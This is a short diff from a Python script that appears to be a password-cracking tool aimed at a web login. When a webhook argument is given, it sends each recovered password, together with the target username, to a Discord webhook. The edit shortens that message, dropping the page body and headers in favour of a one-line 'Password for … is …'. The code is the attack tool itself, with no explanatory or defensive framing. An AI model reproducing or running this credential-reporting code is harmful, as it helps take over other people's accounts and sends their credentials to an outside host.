@@ -375,33 +375,12 @@ print(f"PASSWORD: {password}")
 
 # send response to discord webhook
 if args.webhook is not None:
-    # generate description
-    if len(response.text) < 4000:
-        description = f"```html\n{response.text}\n```"
-    else:
-        description = f"```html\n{response.text[:4000]}\n```... ({4000 - len(response.text)})"
-    # generate fields
-    fields = []
-    for header in response.headers:
-        if len(response.headers[header]) < 1000:
-            value = f"`{response.headers[header]}`"
-        else:
-            value = f"`{response.headers[header][1000:]}` ... ({1000 - len(response.headers[header])})"
-        fields.append({
-            "name": header,
-            "value": value
-        })
-    # send
     webhook.send({
         "embeds": [
             {
-                "title": password,
-                "description": description,
+                "title": "Password found",
+                "description": f"Password for `{args.username}` is `{password}`",
                 "color": 0x8E04B9,
-                "fields": fields,
-                "author": {
-                    "name": f"Password found for {args.username}"
-                },
                 "footer": {
                     "text": f"status: {response.status_code}"
                 }
